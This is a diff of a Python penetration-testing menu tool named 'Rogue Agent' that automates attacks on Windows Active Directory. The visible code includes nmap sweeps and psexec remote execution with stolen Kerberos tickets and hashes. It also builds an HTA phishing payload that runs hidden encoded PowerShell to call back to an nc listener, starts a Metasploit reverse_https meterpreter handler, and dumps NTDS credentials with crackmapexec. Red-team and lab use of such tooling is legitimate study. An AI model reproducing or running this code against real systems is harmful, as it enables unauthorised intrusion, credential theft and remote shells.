@@ -105,47 +105,47 @@ else:
 
 def testOne():
    if TIP[:5] == "EMPTY":
-      print("[-] The remote IP has not been specified...")
+      print("[-] REMOTE IP has not been specified...")
       return 1
    return 0
    
 def testTwo():
    if TIP[:5] == "EMPTY":
-      print("[-] The remote IP has not been specified...")
+      print("[-] REMOTE IP has not been specified...")
       return 1
    if DOM[:5] == "EMPTY":
-      print("[-] A domain name has not been specified...")
+      print("[-] DOMAIN NAME has not been specified...")
       return 1
    return 0  
    
 def testThree():
    if USR[:2] == "''":
-      print("[-] A username has not been specified...")
+      print("[-] USERNAME has not been specified...")
       return 1
    if SID[:5] == "EMPTY":
-      print("[-] The domain SID has not been specified...")
+      print("[-] Domain SID has not been specified...")
       return 1
    return 0
    
 def testFour(variable):
    if variable not in PTS:
-      print("[-] Port " + variable + " not found in live ports listing...")
+      print("[-] Port " + variable + " not found in live ports...")
       return 1
    else:
       return 0
 
 def spacePadding(variable,value):
    variable = variable.rstrip("\n")
+   variable = variable[:value]
    while len(variable) < value:
       variable += " "
-   variable = variable[:value]
    return variable
 
 def dotPadding(variable,value):
    variable = variable.rstrip("\n")
+   variable = variable[:value] 
    while len(variable) < value:
       variable += "."
-   variable = variable[:value] 
    return variable
 
 def getTime():
@@ -158,11 +158,11 @@ def getTime():
    return variable   
    
 def getPort():
-   num = input("[*] Please enter a listening port number: ")
+   num = input("[*] Please enter the listening port number: ")
    if num.isdigit():
       return num
    else:
-      print("[-] I'm sorry, I do not understand the value " + num + "...")
+      print("[-] Sorry, I did not understand the value " + num + "...")
       return 1
 
 def command(variable):
@@ -172,7 +172,7 @@ def command(variable):
    return
  
 def prompt():
-   userInput = input("\nPress ENTER to continue...")
+   null = input("\nPress ENTER to continue...")
    return
    
 def wipeTokens(VALD):
@@ -207,10 +207,8 @@ def privCheck(TGT):
    variable = variable.rstrip(" ")
    if variable != "":
       command("export KRB5CCNAME=" + variable)
-      print("[*] Checking ticket status " + variable + "...")
+      print("[*] Checking ticket status for " + variable + "...")
       command(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
-      command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
-      command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
       TGT = spacePadding(variable, COL1)
    else:
       print("[-] Unable to find a valid ticket...")
@@ -558,12 +556,12 @@ def display():
 def options():
    print('\u2551' + "(01) Re/Set DNS  SERVER (12) Synchronize Time (23) Get Arch (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) Editor USER (78) Hydra  FTP (89) FTP      " + '\u2551')
    print('\u2551' + "(02) Re/Set REMOTE   IP (13) Compile Exploits (24) Net View (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
-   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start HTTPServer (25) Services (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) Editor HASH (80) Hydra  WEB (91) SSHKeyID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start SMB Server (26) AT  Exec (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Boot HTTP Server (25) Services (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) Editor HASH (80) Hydra  WEB (91) SSHKeyID " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Boot SMB  Server (26) AT  Exec (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
    print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) DCOMExec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  POP (93) Netcat   " + '\u2551')
    print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) SMB Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSF RSHELL (96) MySQL    " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) SMB Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF Tomcat (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSF RShell (96) MySQL    " + '\u2551')
    print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live  PORTS (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87) RemDesktop (98)          " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
@@ -584,12 +582,12 @@ Reset  = '\e[0m'
 
 command("echo '" + Red + "'")
 command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
-command("clear; cat " + dataDir + "/banner0.txt")
+command("clear; cat " + dataDir + "/banner1.txt")
 command("echo '" + Yellow + "'")
 print("\t\t\t\t\t\t               T R E A D S T O N E  E D I T I O N                \n")
 command("echo '" + Reset + "'")
 
-print("[*] Booting program, please wait...")
+print("[*] Booting rogue agent, please wait...")
 print("[+] Using localhost IP address " + localIP + "...")
 
 # -------------------------------------------------------------------------------------
@@ -618,7 +616,7 @@ if not os.path.exists(workDir):
 else:
    print("[+] Directory " + workDir + " already exists...")   
    
-print("[*] Populating system variables...")
+print("[+] Populating system variables...")
 if not os.path.exists(dataDir + "/usernames.txt"):			
    command("touch " + dataDir + "/usernames.txt")
    print("[+] File usernames.txt created...")
@@ -649,21 +647,21 @@ if not os.path.exists(dataDir + "/tokens.txt"):
 else:
    print("[+] File tokens.txt already exists...")
    
-SKEW = 0                                # TIME-SKEW SWITCH
-DOMC = 0                                # DOMAIN SWITCH
-DNSC = 0                                # DNS SWITCH
-HTTP = 0				# HTTP SERVER PORT
+SKEW = 0                                  # TIME-SKEW SWITCH
+DOMC = 0                                  # DOMAIN SWITCH
+DNSC = 0                                  # DNS SWITCH
+HTTP = 0				  # HTTP SERVER PORT
 
-COL1 = 40                               # MAX LEN SESSION DATA
-COL2 = 44                               # MAX LEN SHARE NAME
-COL3 = 23                               # MAX LEN USER NAME
-COL4 = 32                               # MAX LEN NTLM HASH
-COL5 = 1                                # MAX LEN TOKEN VALUE
+COL1 = 40                                 # MAX LEN SESSION DATA
+COL2 = 44                                 # MAX LEN SHARE NAME
+COL3 = 23                                 # MAX LEN USER NAME
+COL4 = 32                                 # MAX LEN NTLM HASH
+COL5 = 1                                  # MAX LEN TOKEN VALUE
 
-SHAR = [" "*COL2]*maxUser		# SHARE NAMES
-USER = [" "*COL3]*maxUser		# USER NAMES
-HASH = [" "*COL4]*maxUser		# NTLM HASH
-VALD = ["0"*COL5]*maxUser		# USER TOKENS
+SHAR = [" "*COL2]*maxUser						# SHARE NAMES
+USER = [" "*COL3]*maxUser						# USER NAMES
+HASH = [" "*COL4]*maxUser						# NTLM HASH
+VALD = ["0"*COL5]*maxUser						# USER TOKENS
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -675,17 +673,17 @@ VALD = ["0"*COL5]*maxUser		# USER TOKENS
 
 if not os.path.exists(dataDir + "/config.txt"):
    print("[-] Configuration file not found - using defualt values...")
-   DNS = "EMPTY              "							# DNS IP
-   TIP = "EMPTY              " 						        # REMOTE IP
-   POR = "EMPTY              " 						        # LIVE PORTS
-   WEB = "EMPTY              " 						        # WEB ADDRESS
-   USR = "''                 " 						        # SESSION USERNAME
-   PAS = "''                 "						        # SESSION PASSWORD       
-   NTM = "EMPTY              " 						        # SESSION HASH
-   TGT = "EMPTY              "						        # SESSION TICKET-NAME
-   DOM = "EMPTY              " 						        # SESSION DOMAIN-NAME
-   SID = "EMPTY              " 						        # SESSION DOMAIN-SID
-   TSH = "EMPTY              " 						        # SESSIOM SHARE
+   DNS = "EMPTY              "						                        # DNS IP
+   TIP = "EMPTY              " 						                        # REMOTE IP
+   POR = "EMPTY              " 						                        # LIVE PORTS
+   WEB = "EMPTY              " 						                        # WEB ADDRESS
+   USR = "''                 " 						                        # SESSION USERNAME
+   PAS = "''                 "						                        # SESSION PASSWORD       
+   NTM = "EMPTY              " 						                        # SESSION HASH
+   TGT = "EMPTY              "						                        # SESSION TICKET-NAME
+   DOM = "EMPTY              " 						                        # SESSION DOMAIN-NAME
+   SID = "EMPTY              " 						                        # SESSION DOMAIN-SID
+   TSH = "EMPTY              " 						                        # SESSIOM SHARE
 else:
    print("[+] Configuration file found - restoring saved data....")
    DNS = linecache.getline(dataDir + "/config.txt", 1).rstrip("\n")
@@ -765,6 +763,22 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='0':   
+      checkParams = testOne()      
+      
+      if checkParams != 1:
+            print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
+            command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
+            PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
+            POR = spacePadding(PTS, COL1)
+
+            if POR[:1] == "":
+               print("[+] Unable to enumerate any port information, good luck!!...")
+            else:
+               print("[+] Found live ports...\n")
+               print(colored(PTS,colour6) + "\n") 
+
+# -----   
+   
       checkParams = testOne()      
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -1062,7 +1076,6 @@ while True:
       BAK = NTM
       NTM = input("[*] Please enter hash value: ")
       if NTM != "":
-         NTM = NTM.rstrip(" ")
          NTM = spacePadding(NTM, COL1)
       else:
          NTM = BAK
@@ -1238,14 +1251,11 @@ while True:
       HTTP = getPort()
       
       if HTTP != 1:
-         print("[*] Starting HTTP server...")
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
-         command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return")
+         command("xdotool type 'clear; cat " + dataDir + "/banner2.txt'; xdotool key Return")
          command("xdotool type 'python3 -m http.server --bind " + localIP + " " + HTTP + "'; xdotool key Return")
-         command("xdotool key Ctrl+Tab")      
-         print("[+] HTTP server started, use " + localIP +  ":" + HTTP + " to connect...")
-      prompt()
+         command("xdotool key Ctrl+Tab")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1256,13 +1266,11 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '15':
-      print("[*] Starting SMB server...")
       command("xdotool key Ctrl+Shift+T")
       command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
-      command("xdotool type 'clear; cat " + dataDir + "/banner2.txt'; xdotool key Return")
+      command("xdotool type 'clear; cat " + dataDir + "/banner3.txt'; xdotool key Return")
       command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return")
       command("xdotool key Ctrl+Tab")            
-      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1610,8 +1618,7 @@ while True:
       
       if checkParams != 1:
          print("[*] Enumerating, please wait....")
-         
-         command(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > domain.tmp")                           
+         command(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > domain.tmp")                  
          command("cat domain.tmp | grep 'Domain SID' > sid.tmp")         
 
          with open("sid.tmp", "r") as read:
@@ -1689,16 +1696,14 @@ while True:
       checkParams = testTwo()
       
       if checkParams != 1:
-         print("[*] Enumerating users, please wait this can take sometime...")   
-               
+         print("[*] Enumerating users, please wait this can take sometime...")         
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password authentication...\n")
             command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
          else:
             print("")
             command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > users.tmp")                           
-       
-         count = len(open('users.tmp').readlines(  ))
+         count = os.path.getsize("users.tmp")   
                
          if count == 0:
             print("[+] File users.tmp is empty...")
@@ -1713,12 +1718,12 @@ while True:
                   break        
                   
          if checkParams != 1:
-            command("rm " + dataDir + "/usernames.txt")
-            command("rm " + dataDir + "/hashes.txt")            
-            command("touch " + dataDir + "/usernames.txt")
-            command("touch " + dataDir + "/hashes.txt")
+            command("rm " + dataDir + "/usernames.txt")          
+            command("rm " + dataDir + "/hashes.txt")                        
+            command("touch " + dataDir + "/hashes.txt")                      
             command("sed -i -n '/Found user: /p' users.tmp")
             command("cat users.tmp | sort > users2.tmp")
+            
             wipeTokens(VALD)
             
             with open("users2.tmp", "r") as read:
@@ -1974,7 +1979,7 @@ while True:
             print("[i] Using HASH value as password credential...")
             command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash -s " + TSH.rstrip(" " ))
          else:
-            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -s " + TSH.rstrip(" "))
+            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " -s " + TSH.rstrip(" "))
       prompt()
    
 # ------------------------------------------------------------------------------------- 
@@ -2554,7 +2559,7 @@ while True:
                command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi")                    
 
       try:
-         prompt()
+         userInput = input("\nPress ENTER to continue...")
       except EOFError as e:
          print(e)
                
@@ -2866,14 +2871,14 @@ while True:
          checkParams = 1
       
       if checkParams != 1:    
+
          print("[*] Starting phishing server...")      
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
-         command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return")
+         command("xdotool type 'clear; cat " + dataDir + "/banner5.txt'; xdotool key Return")
          command("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
          command("xdotool key Ctrl+Tab")      
       
-         print("[*] Creating the phishing exploit...")      
          payLoad = f"""      
          a=new ActiveXObject("WScript.Shell");
          a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParams)}", 0);window.close();
@@ -2955,7 +2960,7 @@ while True:
                    
             command("xdotool key Ctrl+Shift+T")
             command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
-            command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return")
+            command("xdotool type 'clear; cat " + dataDir + "/banner5.txt'; xdotool key Return")
             command("xdotool type 'rlwrap nc -nvlp " + num + "'; xdotool key Return")
             command("xdotool key Ctrl+Tab")      
                    
@@ -3299,25 +3304,20 @@ while True:
    if selection =='85':
       checkParams = getPort()
       
-      if checkParams != 1:
-         print("[*] Starting metasploit server...")
-         
+      if checkParams != 1:        
          with open("meterpreter.rc", "w") as write:
             write.write("use exploit/multi/handler\n")
-            write.write("set PAYLOAD /windows/meterpreter/reverse_https\n")	# NEED OPTION TO CHOOSE A DIFFERNT PAYLOAD AT SOME STAGE
+            write.write("set PAYLOAD /windows/meterpreter/reverse_https\n")
             write.write("set LHOST " + localIP + "\n")
             write.write("set LPORT " + checkParams + "\n")
             write.write("clear\n")
-            write.write("cat " + dataDir + "/banner3.txt\n")
+            write.write("cat " + dataDir + "/banner4.txt\n")
             write.write("run\n")
-
+            
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          command("xdotool key Ctrl+Tab")
-         
-         print("[+] Reverse shell started, use exploit 'win_https_reverse_shell.exe' to connect..")
-      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
